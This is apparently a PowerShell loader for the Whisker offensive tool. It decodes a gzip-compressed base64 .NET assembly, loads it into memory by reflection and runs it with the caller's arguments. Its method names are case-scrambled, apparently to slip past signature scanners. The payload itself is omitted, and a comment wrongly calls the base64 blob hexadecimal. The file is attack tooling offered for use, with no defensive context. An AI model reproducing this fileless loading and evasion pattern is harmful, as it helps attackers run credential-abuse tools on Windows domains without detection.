function Invoke-Whisker
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = ""
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIAA...AA==")) # The omitted "H4sIAA...AA==" is actually a 22557 character long hexadecimal string.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    [Whisker.Program]::main($Command.Split(" "))
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
